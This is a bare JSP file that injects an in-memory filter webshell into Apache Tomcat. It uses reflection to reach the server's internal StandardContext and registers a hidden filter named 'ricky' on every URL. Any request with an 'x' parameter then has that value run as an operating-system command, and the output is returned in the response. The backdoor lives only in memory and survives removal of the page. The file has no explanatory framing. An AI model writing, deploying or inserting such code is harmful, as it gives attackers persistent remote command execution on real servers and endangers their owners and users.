<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.util.HashMap" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
final String filterName = "ricky";
try{
    ServletContext servletContext = request.getSession().getServletContext();
//    ServletContext servletContext = request.getServletContext();
    if(servletContext.getFilterRegistration(filterName) == null){
        Field servletfield = servletContext.getClass().getDeclaredField("context");
        servletfield.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) servletfield.get(servletContext);
        Field applicationfield = applicationContext.getClass().getDeclaredField("context");
        applicationfield.setAccessible(true);
        StandardContext standardContext = (StandardContext) applicationfield.get(applicationContext);

        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {
            }
            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest request = (HttpServletRequest) servletRequest;
                if(request.getParameter("x") != null){
                    Process process = Runtime.getRuntime().exec(request.getParameter("x"));
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String str = "";
                    String line;
                    while((line = reader.readLine()) != null){
                        str += line;
                    }
                    servletResponse.getOutputStream().write(str.getBytes());
                    servletResponse.getOutputStream().flush();
                    servletResponse.getOutputStream().close();
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }
            @Override
            public void destroy() {
            }
        };

        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(filterName);
        filterDef.setFilterClass(filter.getClass().getName());
        filterDef.setFilter(filter);

        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName(filterName);
        filterMap.addURLPattern("/*");
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        Constructor<?>[] constructor = ApplicationFilterConfig.class.getDeclaredConstructors();
        constructor[0].setAccessible(true);
        ApplicationFilterConfig appconfig = (ApplicationFilterConfig) constructor[0].newInstance(standardContext, filterDef);

        Field configfield = standardContext.getClass().getDeclaredField("filterConfigs");
        configfield.setAccessible(true);
        HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String, ApplicationFilterConfig>) configfield.get(standardContext);
        filterConfigs.put(filterName, appconfig);

        standardContext.addFilterDef(filterDef);
        standardContext.addFilterMapBefore(filterMap);

        out.println("tomcat filter added");
    }
}catch (Exception e){
    e.printStackTrace();
}
%>